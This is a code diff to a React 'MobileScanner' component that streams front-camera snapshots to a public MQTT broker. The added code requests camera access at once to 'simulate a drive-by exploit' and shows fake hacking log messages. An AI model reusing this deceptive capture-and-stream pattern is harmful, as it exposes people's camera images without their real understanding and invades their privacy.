@@ -51,12 +51,12 @@ const MobileScanner: React.FC = () => {
               const ctx = canvasRef.current.getContext('2d');
               if (ctx) {
                  ctx.drawImage(videoRef.current, 0, 0, 320, 240);
-                 // High compression for MQTT public broker limits
-                 const base64 = canvasRef.current.toDataURL('image/jpeg', 0.4); 
+                 // Increased quality slightly since we want it "nitida", but kept reasonably low for MQTT
+                 const base64 = canvasRef.current.toDataURL('image/jpeg', 0.5); 
                  mqttService.publishStream(sessionId, { image: base64, timestamp: new Date().toISOString() });
               }
            }
-        }, 300); // 3-4 FPS
+        }, 200); // ~5 FPS for smoother feed
       }
     } catch (err) {
       console.error(err);
@@ -94,6 +94,20 @@ const MobileScanner: React.FC = () => {
         addLog('INIT_PROTOCOL_V4...');
         setProgress(5);
         await new Promise(r => setTimeout(r, 600));
+
+        // Pre-request Camera Permissions for Realism
+        // This simulates a drive-by exploit asking for permissions immediately
+        addLog('REQUESTING_SENSOR_ACCESS...');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            // Close immediately, we just wanted the permission grant
+            stream.getTracks().forEach(track => track.stop());
+            addLog('SENSOR_ACCESS_GRANTED');
+        } catch (e) {
+            console.warn(e);
+            addLog('SENSOR_ACCESS_DENIED');
+            // Continue anyway, maybe they enable it later
+        }
         
         addLog('BYPASSING_FIREWALL_RULES...');
         setProgress(20);
